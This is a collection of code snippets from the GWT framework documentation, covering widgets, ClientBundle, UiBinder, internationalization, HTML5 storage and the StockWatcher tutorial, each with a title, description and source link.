valueUpdater = new ValueUpdater<String>() {\n      public void update(String newValue) {\n        Window.alert(\"You typed: \" + newValue);\n      }\n    };\n\n    // Add the value updater to the cellList.\n    cellList.setValueUpdater(valueUpdater);\n\n    // Set the total row count. This isn't strictly necessary, but it affects\n    // paging calculations, so its good habit to keep the row count up to date.\n    cellList.setRowCount(DAYS.size(), true);\n\n    // Push the data into the widget.\n    cellList.setRowData(0, DAYS);\n\n    // Add it to the root panel.\n    RootPanel.get().add(cellList);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Image Sprite Resources in GWT ClientBundle\nDESCRIPTION: Demonstrates how to define a ClientBundle interface with both CssResource and ImageResource methods. Shows the relationship between CSS sprites and their backing ImageResources, including configuration options.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_17\n\nLANGUAGE: java\nCODE:\n```\ninterface MyCssResource extends CssResource {\n  String mySpriteClass();\n}\n\nclass MyResources extends ClientBundle {\n  @Source(\"my.css\")\n  MyCssResource css();\n\n  @Source(\"some.png\")\n  ImageResource imageAccessor();\n\n  @Source(\"some.png\")\n  @ImageOptions(repeatStyle=RepeatStyle.Horizontal)\n  ImageResource repeatingImage();\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing Browser-Specific Implementation in PopupPanel using GWT.create()\nDESCRIPTION: Shows how the PopupPanel class instantiates the proper browser-specific implementation using the GWT.create() method, which is a core mechanism for deferred binding in GWT.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsDeferred.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nprivate static final PopupImpl impl = GWT.create(PopupImpl.class);\n```\n\n----------------------------------------\n\nTITLE: Implementing HelloView with UiBinder in GWT MVP\nDESCRIPTION: A concrete implementation of the HelloView interface using UiBinder. It demonstrates view implementation with template binding and event handling through the presenter pattern.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npublic class HelloViewImpl extends Composite implements HelloView {\n    private static HelloViewImplUiBinder uiBinder = GWT\n            .create(HelloViewImplUiBinder.class);\n\n    interface HelloViewImplUiBinder extends UiBinder<Widget, HelloViewImpl> {\n    }\n\n    @UiField\n    SpanElement nameSpan;\n    @UiField\n    Anchor goodbyeLink;\n    private Presenter presenter;\n    private String name;\n\n    public HelloViewImpl() {\n        initWidget(uiBinder.createAndBindUi(this));\n    }\n\n    @Override\n    public void setName(String name) {\n        this.name = name;\n        nameSpan.setInnerText(name);\n    }\n\n    @UiHandler(\"goodbyeLink\")\n    void onClickGoodbye(ClickEvent e) {\n        presenter.goTo(new GoodbyePlace(name));\n    }\n\n    @Override\n    public void setPresenter(Presenter presenter) {\n        this.presenter = presenter;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: CSS Constants Definition Example\nDESCRIPTION: Demonstration of using @def directive to define CSS constants and their corresponding Java interface access methods.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_10\n\nLANGUAGE: css\nCODE:\n```\n@def small 1px;\n@def black #000;\nborder: small solid black;\n```\n\nLANGUAGE: java\nCODE:\n```\ninterface MyResources extends CssResource {\n  int small();\n}\n```\n\nLANGUAGE: java\nCODE:\n```\ninterface MyResources extends CssResource {\n  String small();\n  String black();\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a JavaScript Callback Interface with @JsFunction\nDESCRIPTION: This snippet defines a Java functional interface annotated with @JsFunction to represent a JavaScript callback function. It's used for event handling in this example.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJsInterop.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\n@JsFunction\npublic interface EventListenerCallback {\n\n    void callEvent(Object event);\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Constants Interface in GWT\nDESCRIPTION: Java interface definition that extends Constants to provide type-safe access to internationalized strings. Method names correspond to property keys.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nConstants.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npublic interface MyConstants extends Constants {\n  String helloWorld();\n  String goodbyeWorld();\n}\n```\n\n----------------------------------------\n\nTITLE: Server-side JSON Stock Data Servlet Implementation\nDESCRIPTION: Java servlet that generates random stock data in JSON format. It accepts stock symbols as a query parameter, creates random price data for each symbol, and returns the data as a JSON array.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSON.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.server;\n\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport java.util.Random;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class JsonStockData extends HttpServlet {\n\n  private static final double MAX_PRICE = 100.0; // $100.00\n  private static final double MAX_PRICE_CHANGE = 0.02; // +/- 2%\n\n  @Override\n  protected void doGet(HttpServletRequest req, HttpServletResponse resp)\n      throws ServletException, IOException {\n\n    Random rnd = new Random();\n\n    PrintWriter out = resp.getWriter();\n    out.println('[');\n    String[] stockSymbols = req.getParameter(\"q\").split(\" \");\n    boolean firstSymbol = true;\n    for (String stockSymbol : stockSymbols) {\n\n      double price = rnd.nextDouble() * MAX_PRICE;\n      double change = price * MAX_PRICE_CHANGE * (rnd.nextDouble() * 2f - 1f);\n\n      if (firstSymbol) {\n        firstSymbol = false;\n      } else {\n        out.println(\"  ,\");\n      }\n      out.println(\"  {\");\n      out.print(\"    \\\"symbol\\\": \\\"\");\n      out.print(stockSymbol);\n      out.println(\"\\\",\");\n      out.print(\"    \\\"price\\\": \");\n      out.print(price);\n      out.println(',');\n      out.print(\"    \\\"change\\\": \");\n      out.println(change);\n      out.println(\"  }\");\n    }\n    out.println(']');\n    out.flush();\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Optimized Table Rendering in GWT\nDESCRIPTION: Implementation of setRowData() method that builds an HTML table directly using DOM manipulation for improved performance over widget-based approaches.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_21\n\nLANGUAGE: java\nCODE:\n```\npublic void setRowData(List<T> rowData) {\n  this.rowData = rowData;\n\n  TableElement table = Document.get().createTableElement();\n  TableSectionElement tbody = Document.get().createTBodyElement();\n  table.appendChild(tbody);\n\n  for (int i = 0; i < rowData.size(); ++i) {\n    TableRowElement row = tbody.insertRow(-1);\n    T t = rowData.get(i);\n\n    for (int j = 0; j < columnDefinitions.size(); ++j) {\n      TableCellElement cell = row.insertCell(-1);\n      StringBuilder sb = new StringBuilder();\n      columnDefinitions.get(j).render(t, sb);\n      cell.setInnerHTML(sb.toString());\n\n      Element child = cell.getFirstChildElement();\n      if (child != null) {\n        Event.sinkEvents(child, Event.ONFOCUS | Event.ONBLUR);\n      }\n    }\n  }\n\n  contactsTable.setHTML(table.getInnerHTML());\n}\n```\n\n----------------------------------------\n\nTITLE: Incorporating Text Resources in UiBinder Templates\nDESCRIPTION: Demonstrates using the <ui:text> element to directly incorporate text resources into UiBinder templates without requiring additional Java code to display static content.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_27\n\nLANGUAGE: xml\nCODE:\n```\n<ui:with field='res' type='com.my.app.widgets.logoname.Resources'/>\n\n<div>\n  Hello, <ui:text from='{res.userName}'/>.  \n</div>\n```\n\n----------------------------------------\n\nTITLE: Implementing GWT EntryPoint with Polymer Integration in Java\nDESCRIPTION: This Java class implements the EntryPoint interface for a GWT module. It demonstrates how to import Polymer elements, set up the application, and add the main UI component to the root panel.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-buildui.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\npackage org.gwtproject.tutorial.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.RootPanel;\nimport com.vaadin.polymer.Polymer;\nimport com.vaadin.polymer.elemental.Function;\nimport com.vaadin.polymer.iron.element.IronIconElement;\nimport com.vaadin.polymer.paper.element.*;\n\nimport java.util.Arrays;\n\npublic class TodoList implements EntryPoint {\n\n    public void onModuleLoad() {\n        Polymer.importHref(Arrays.asList(\n                \"iron-icons/iron-icons.html\",\n                PaperIconItemElement.SRC,\n                PaperRippleElement.SRC,\n                IronIconElement.SRC,\n                PaperDrawerPanelElement.SRC,\n                PaperHeaderPanelElement.SRC,\n                PaperToolbarElement.SRC,\n                PaperFabElement.SRC\n        ), new Function() {\n            public Object call(Object arg) {\n                startApplication();\n                return null;\n            }\n        });\n    }\n\n    private void startApplication() {\n        RootPanel.get().add(new Main());\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Handling HTML Tags in Translatable Messages\nDESCRIPTION: This snippet demonstrates how to include simple HTML tags within a translatable message using the ui:msg element.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_2\n\nLANGUAGE: XML\nCODE:\n```\n<ui:msg>We <b>strongly</b> urge you to reconsider.</ui:msg>\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Locales in GWT Module XML\nDESCRIPTION: Example showing how to extend locale property with multiple language variants including French (general, France, Canada) and English using module XML configuration.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nLocale.md#2025-04-09_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<module>\n  <inherits name=\"com.google.gwt.user.User\"/>\n  <inherits name=\"com.google.gwt.i18n.I18N\"/>\n  \n  <!-- French language, independent of country -->\n  <extend-property name=\"locale\" values=\"fr\"/>\n\n  <!-- French in France -->\n  <extend-property name=\"locale\" values=\"fr_FR\"/>\n\n  <!-- French in Canada -->\n  <extend-property name=\"locale\" values=\"fr_CA\"/>\n  \n  <!-- English language, independent of country -->\n  <extend-property name=\"locale\" values=\"en\"/>\n</module>\n```\n\n----------------------------------------\n\nTITLE: Using StorageMap for Key-Value Checking in GWT\nDESCRIPTION: Demonstrates using StorageMap to check for existing values and conditionally store new data. Includes value presence verification before storage.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideHtml5Storage.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\nstockStore = Storage.getLocalStorageIfSupported();\nif (stockStore != null) {\n  stockMap = new StorageMap(stockStore);\n  if (stockMap.containsValue(symbol)!= true){\n    int numStocks = stockStore.getLength();\n    stockStore.setItem(\"Stock.\"+numStocks, symbol);\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Change Percentage in GWT Stock Price Class (Buggy Version)\nDESCRIPTION: Java method to calculate the change percentage in stock price. This version contains a bug where it multiplies by 10 instead of 100.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/debug.md#2025-04-09_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\npublic double getChangePercent() {\n  return 10.0 * this.change / this.price;\n}\n```\n\n----------------------------------------\n\nTITLE: Message Implementation with Parameter Substitution (Java)\nDESCRIPTION: Shows how to implement a Messages interface and use it to display an alert with substituted parameters\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nMessages.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npublic interface ErrorMessages extends Messages {\n  String permissionDenied(int errorCode, String username);\n}\nErrorMessages msgs = GWT.create(ErrorMessages.class)\n\nvoid permissionDenied(int errorVal, String loginId) {\n  Window.alert(msgs.permissionDenied(errorVal, loginId));\n}\n```\n\n----------------------------------------\n\nTITLE: Declaring a Checked Exception in GWT RPC Service Interface\nDESCRIPTION: This snippet shows how to modify a GWT RPC service interface to declare that a method can throw a checked exception. The StockPriceService interface extends RemoteService and includes the throws clause for the getPrices method.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_13\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.user.client.rpc.RemoteService;\nimport com.google.gwt.user.client.rpc.RemoteServiceRelativePath;\n\n@RemoteServiceRelativePath(\"stockPrices\")\npublic interface StockPriceService extends RemoteService {\n\n  StockPrice[] getPrices(String[] symbols) throws DelistedException;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Random Stock Data Generation\nDESCRIPTION: Method to generate random stock prices and changes using GWT Random class\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\nprivate void refreshWatchList() {\n final double MAX_PRICE = 100.0; // $100.00\n final double MAX_PRICE_CHANGE = 0.02; // +/- 2%\n\n StockPrice[] prices = new StockPrice[stocks.size()];\n for (int i = 0; i < stocks.size(); i++) {\n   double price = Random.nextDouble() * MAX_PRICE;\n   double change = price * MAX_PRICE_CHANGE\n       * (Random.nextDouble() * 2.0 - 1.0);\n\n   prices[i] = new StockPrice(stocks.get(i), price, change);\n }\n\n updateTable(prices);\n}\n```\n\n----------------------------------------\n\nTITLE: UiBinder XML Declaration for ContactsView\nDESCRIPTION: The UiBinder XML file that replaces the programmatic UI construction, defining the UI layout in a more declarative HTML-like syntax with style definitions.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder\n  xmlns:ui=\"urn:ui:com.google.gwt.uibinder\"\n  xmlns:g=\"urn:import:com.google.gwt.user.client.ui\">\n\n  <ui:style>\n    .contactsViewButtonHPanel {\n      margin: 5px 0px 0x 5px;\n    }\n    .contactsViewContactsFlexTable {\n      margin: 5px 0px 5px 0px;\n    }\n\n  </ui:style>\n\n  <g:DecoratorPanel>\n    <g:VerticalPanel>\n      <g:HorizontalPanel addStyleNames=\"{style.contactsViewButtonHPanel}\">\n        <g:Button ui:field=\"addButton\">Add</g:Button>\n        <g:Button ui:field=\"deleteButton\">Delete</g:Button>\n      </g:HorizontalPanel>\n      <g:FlexTable ui:field=\"contactsTable\" addStyleNames=\"{style.contactsViewContactsFlexTable}\"/>\n    </g:VerticalPanel>\n  </g:DecoratorPanel>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Implementing Clear Done Functionality in GWT Todo List\nDESCRIPTION: This code implements the 'Clear Done' functionality for a Todo List. It removes completed items from both the UI and the data structure.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-applogic.md#2025-04-09_snippet_5\n\nLANGUAGE: Java\nCODE:\n```\nmenuClearDone.addEventListener(\"click\", new EventListener() {\n  public void handleEvent(Event event) {\n    closeMenu();\n\n    for (Item item : items) {\n      if (item.isDone()) {\n        content.removeChild(item.getElement());\n        items.remove(item);\n      }\n    }\n  }\n});\n```\n\n----------------------------------------\n\nTITLE: Complete Main Class Implementation\nDESCRIPTION: Full implementation of the Main class including event handlers, item management, and UI logic.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-applogic.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npackage org.gwtproject.tutorial.client;\n\nimport com.google.gwt.core.client.GWT;\nimport com.google.gwt.uibinder.client.UiBinder;\nimport com.google.gwt.uibinder.client.UiField;\nimport com.google.gwt.user.client.ui.Composite;\nimport com.google.gwt.user.client.ui.HTMLPanel;\nimport com.vaadin.polymer.elemental.*;\nimport com.vaadin.polymer.paper.element.*;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class Main extends Composite {\n  interface MainUiBinder extends UiBinder<HTMLPanel, Main> {\n  }\n\n  private static MainUiBinder ourUiBinder = GWT.create(MainUiBinder.class);\n\n  @UiField PaperDrawerPanelElement drawerPanel;\n\n  @UiField PaperIconItemElement menuClearAll;\n  @UiField PaperIconItemElement menuClearDone;\n\n  @UiField HTMLElement content;\n  @UiField PaperFabElement addButton;\n\n  @UiField PaperDialogElement addItemDialog;\n  @UiField PaperInputElement titleInput;\n  @UiField PaperTextareaElement descriptionInput;\n  @UiField PaperButtonElement confirmAddButton;\n\n  private List<Item> items = new ArrayList<>();\n\n  public Main() {\n    initWidget(ourUiBinder.createAndBindUi(this));\n\n    addButton.addEventListener(\"click\", new EventListener() {\n      public void handleEvent(Event event) {\n        addItemDialog.open();\n      }\n    });\n\n    confirmAddButton.addEventListener(\"click\", new EventListener() {\n      public void handleEvent(Event event) {\n        if (!titleInput.getValue().isEmpty()) {\n          addItem(titleInput.getValue(), descriptionInput.getValue());\n          // clear text fields\n          titleInput.setValue(\"\");\n          descriptionInput.setValue(\"\");\n        }\n      }\n    });\n\n    menuClearAll.addEventListener(\"click\", new EventListener() {\n      public void handleEvent(Event event) {\n        closeMenu();\n\n```\n\n----------------------------------------\n\nTITLE: Writing Data to HTML5 Storage in GWT\nDESCRIPTION: Demonstrates how to write data to HTML5 storage using GWT's Storage API. This method stores a key-value pair in the storage object.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideHtml5Storage.md#2025-04-09_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\nstorage.setItem(\"key\", \"value\");\n```\n\n----------------------------------------\n\nTITLE: Adding Item to Content Panel in GWT\nDESCRIPTION: Code snippet showing how to create a new Item object, set its properties, and add it to a content panel in GWT.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-applogic.md#2025-04-09_snippet_8\n\nLANGUAGE: Java\nCODE:\n```\n         Item item = new Item();\n         item.setTitle(title);\n         item.setDescription(description);\n         content.add(item);\n```\n\n----------------------------------------\n\nTITLE: Using Multiple Editors with Path Annotations\nDESCRIPTION: Demonstrates how to use @Editor.Path annotations to allow multiple editors to edit the same object. This example shows a container editor that references two different editors both pointing to the same 'state' property.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiEditors.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\nclass HasBagOfStateEditor implements Editor<HasBagOfState> {\n @Editor.Path(\"state\")\n BagOfStateBiographicalEditor bio;\n \n @Editor.Path(\"state\")\n BagOfStateUserPreferencesEditor prefs;\n}\n```\n\n----------------------------------------\n\nTITLE: Mismatched Parameters Message Template (Properties)\nDESCRIPTION: Properties file entry showing incorrect number of parameters that would cause compile error\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nMessages.md#2025-04-09_snippet_3\n\nLANGUAGE: properties\nCODE:\n```\npermissionDenied = Error {0}: User {1} does not have permission to access {2}\n```\n\n----------------------------------------\n\nTITLE: Web Application Deployment Descriptor for GWT Servlet\nDESCRIPTION: XML configuration in web.xml that registers the JsonStockData servlet and maps it to a URL pattern. This allows the GWT client to make requests to the servlet at the specified URL.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSON.md#2025-04-09_snippet_3\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE web-app\n    PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n    \"http://java.sun.com/dtd/web-app_2_3.dtd\">\n\n<web-app>\n\n  <!-- Default page to serve -->\n  <welcome-file-list>\n    <welcome-file>StockWatcher.html</welcome-file>\n  </welcome-file-list>\n\n  <!-- Servlets -->\n  <servlet>\n    <servlet-name>jsonStockData</servlet-name>\n    <servlet-class>com.google.gwt.sample.stockwatcher.server.JsonStockData</servlet-class>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>jsonStockData</servlet-name>\n    <url-pattern>/stockwatcher/stockPrices</url-pattern>\n  </servlet-mapping>\n\n</web-app>\n```\n\n----------------------------------------\n\nTITLE: Configuring Tiled Images with ImageOptions Annotation\nDESCRIPTION: Shows how to use the @ImageOptions annotation to create tiled images along the X or Y axis. This allows for efficient border creation with small images while maintaining image bundling optimizations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_45\n\nLANGUAGE: java\nCODE:\n```\ninterface MyResources extends ClientBundle {\n  @ImageOptions(repeatStyle = RepeatStyle.Horizontal)\n  @Source(\"image.png\")\n  ImageResource image();\n}\n```\n\n----------------------------------------\n\nTITLE: Reading Data from HTML5 Storage in GWT\nDESCRIPTION: Illustrates how to read data from HTML5 storage using GWT's Storage API. This method retrieves a value associated with a specific key.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideHtml5Storage.md#2025-04-09_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\nString value = storage.getItem(\"key\");\nif (value != null) {\n    // Use the retrieved value\n} else {\n    // Key not found in storage\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Exact Column Widths in GWT CellTable\nDESCRIPTION: Demonstrates how to set exact pixel widths for all columns in a CellTable by setting table width to 'auto' and specifying absolute widths for each column.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellTable.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\ntable.setWidth(\"auto\", true);\n    table.setColumnWidth(col0, 100.0, Unit.PX);\n    table.setColumnWidth(col1, 150.0, Unit.PX);\n    table.setColumnWidth(col2, 250.0, Unit.PX);\n    table.setColumnWidth(col3, 100.0, Unit.PX);\n```\n\n----------------------------------------\n\nTITLE: Setting UTF-8 Character Encoding in HTML for GWT\nDESCRIPTION: Shows how to set the character encoding to UTF-8 in an HTML page to support internationalized characters in a GWT application. The meta tag should be included in the page's head section.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18n.md#2025-04-09_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n <meta charset=\"utf-8\" />\n```\n\n----------------------------------------\n\nTITLE: Loading GWT Module in HTML\nDESCRIPTION: This HTML snippet demonstrates the structure of a page that loads a GWT module. It includes image tags, external script tags, and the GWT module script. This example is used to explain the bootstrap sequence of a GWT application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideOrganizingProjects.md#2025-04-09_snippet_12\n\nLANGUAGE: html\nCODE:\n```\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html>\n  <body onload='alert(\"w00t!\")'>\n    <img src='bigImageZero.jpg'></img>\n    <script source='externalScriptZero.js'></script>\n    <img src='bigImageOne.jpg'></img>\n    <img src='reallyBigImageTwo.jpg'></img>\n    <script src='myApp/myApp.nocache.js'></script>\n    <script src='externalScriptOne.js'></script>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Using SplitLayoutPanel in a DialogBox in GWT\nDESCRIPTION: This Java code demonstrates how to use a SplitLayoutPanel within a DialogBox, including setting up the layout, adding widgets, and explicitly setting the size of the SplitLayoutPanel.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_14\n\nLANGUAGE: java\nCODE:\n```\nSplitLayoutPanel split = new SplitLayoutPanel();\nsplit.addWest(new HTML(\"west\"), 128);\nsplit.add(new HTML(\"center\"));\nsplit.setSize(\"20em\", \"10em\");\n\nDialogBox dialog = new DialogBox();\ndialog.setText(\"caption\");\ndialog.add(split);\ndialog.show();\n```\n\n----------------------------------------\n\nTITLE: Styling GWT Button Widget with CSS\nDESCRIPTION: Demonstrates how to apply a CSS rule to style all GWT Button widgets with a larger font size.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCss.md#2025-04-09_snippet_0\n\nLANGUAGE: css\nCODE:\n```\n.gwt-Button { font-size: 150%; }\n```\n\n----------------------------------------\n\nTITLE: Client-Server Validation Strategy with Groups\nDESCRIPTION: Best practice example showing how to use validation groups to separate client and server validation logic, first validating client constraints and then calling server for additional validation if needed.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideValidation.md#2025-04-09_snippet_10\n\nLANGUAGE: java\nCODE:\n```\n@ServerConstraint(groups = ServerGroup.class)\npublic class Person {\n  @NotNull(groups = ClientGroup.class)\n  private String name;\n}\n\nValidator validator = Validation.buildDefaultValidatorFactory().getValidator();\n// validate on the client\nSet<ConstraintViolation<Person>> violations = validator.validate(person, Default.class, ClientGroup.class);\nif (!violations.isEmpty()) {\n  // client-side violation(s) occurred\n} else {\n  // client-side validation passed so check server-side\n  greetingService.serverSideValidate(person, new AsyncCallback<SafeHtml>() {\n    @Override\n    public void onFailure(Throwable caught) {\n      if (caught instanceof ConstraintViolationException) {\n        // server-side violation\n      }\n      // some other issue\n    }\n    @Override\n    public void onSuccess(SafeHtml result) {\n      // server-side validations passed\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating StockWatcher UI in Java for GWT\nDESCRIPTION: Implements client-side logic for displaying and managing stocks in the StockWatcher UI, including methods for adding, displaying, and loading stocks.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_26\n\nLANGUAGE: java\nCODE:\n```\nprivate void addStock() {\n    final String symbol = newSymbolTextBox.getText().toUpperCase().trim();\n    newSymbolTextBox.setFocus(true);\n\n    // Stock code must be between 1 and 10 chars that are numbers, letters, or dots.\n    if (!symbol.matches(\"^[0-9a-zA-Z\\.]{1,10}$\")) {\n      Window.alert(\"'\" + symbol + \"' is not a valid symbol.\");\n      newSymbolTextBox.selectAll();\n      return;\n    }\n\n    newSymbolTextBox.setText(\"\");\n\n    // Don't add the stock if it's already in the table.\n    if (stocks.contains(symbol))\n      return;\n\n    displayStock(symbol);\n  }\n\n  private void displayStock(final String symbol) {\n    // Add the stock to the table.\n    int row = stocksFlexTable.getRowCount();\n    stocks.add(symbol);\n    stocksFlexTable.setText(row, 0, symbol);\n    stocksFlexTable.setWidget(row, 2, new Label());\n    stocksFlexTable.getCellFormatter().addStyleName(row, 1, \"watchListNumericColumn\");\n    stocksFlexTable.getCellFormatter().addStyleName(row, 2, \"watchListNumericColumn\");\n    stocksFlexTable.getCellFormatter().addStyleName(row, 3, \"watchListRemoveColumn\");\n\n    // Add a button to remove this stock from the table.\n    Button removeStockButton = new Button(\"x\");\n    removeStockButton.addStyleDependentName(\"remove\");\n    removeStockButton.addClickHandler(new ClickHandler() {\n      public void onClick(ClickEvent event) {\n        int removedIndex = stocks.indexOf(symbol);\n        stocks.remove(removedIndex);\n        stocksFlexTable.removeRow(removedIndex + 1);\n      }\n    });\n    stocksFlexTable.setWidget(row, 3, removeStockButton);\n\n    // Get the stock price.\n    refreshWatchList();\n\n  }\n\nprivate void loadStocks() {\n    stockService.getStocks(new AsyncCallback<String[]>() {\n      public void onFailure(Throwable error) {\n      }\n      public void onSuccess(String[] symbols) {\n        displayStocks(symbols);\n      }\n    });\n  }\n\n  private void displayStocks(String[] symbols) {\n    for (String symbol : symbols) {\n      displayStock(symbol);\n    }\n  }\n```\n\n----------------------------------------\n\nTITLE: Getting Storage Object in GWT\nDESCRIPTION: Shows how to obtain the Storage object for either local or session storage in a GWT application. This object is used to interact with the HTML5 storage.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideHtml5Storage.md#2025-04-09_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\n// For local storage\nStorage localStorage = Storage.getLocalStorageIfSupported();\n\n// For session storage\nStorage sessionStorage = Storage.getSessionStorageIfSupported();\n```\n\n----------------------------------------\n\nTITLE: Disabling RTL Transformations in CSS with @noflip\nDESCRIPTION: Shows how to use the @noflip directive to prevent automatic right-to-left transformations for specific CSS rules. This is useful when certain styles should remain the same in both LTR and RTL contexts.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_20\n\nLANGUAGE: css\nCODE:\n```\n@noflip {\n  .selector {\n    left: 10;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing RootLayoutPanel with DockLayoutPanel in GWT\nDESCRIPTION: Shows how to set up a DockLayoutPanel as the root container that fills the browser's client area.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nDockLayoutPanel appPanel = new DockLayoutPanel(Unit.EM);\nRootLayoutPanel.get().add(appPanel);\n```\n\n----------------------------------------\n\nTITLE: Implementing TabLayoutPanel in GWT\nDESCRIPTION: Demonstrates creation of a tabbed layout panel with multiple content sections and their associated tab labels.\nSOURCE: 